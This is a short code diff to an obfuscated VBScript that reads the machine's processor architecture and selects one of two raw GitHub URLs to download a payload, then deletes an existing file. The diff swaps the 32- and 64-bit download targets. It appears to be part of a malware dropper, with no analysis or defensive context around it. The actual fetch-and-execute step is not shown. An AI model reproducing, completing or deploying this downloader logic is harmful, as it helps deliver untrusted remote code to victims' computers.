@@ -5,9 +5,9 @@ Dim FDrte
 Set FDrtr=wscript.createobject("wscript.shell")
 FDrte=FDrtr.environment("system").item("processor_architecture")
 if right(FDrte, 2) = "64" then
-FDrtw = "https://raw.githubusercontent.com/jommb/872/master/m"
-else
 FDrtw = "https://raw.githubusercontent.com/jommb/872/master/b"
+else
+FDrtw = "https://raw.githubusercontent.com/jommb/872/master/m"
 end if
 Set FDrtt = CreateObject("Scripting.FileSystemObject")
 If FDrtt.FileExists(UMbty) Then FDrtt.DeleteFile UMbty
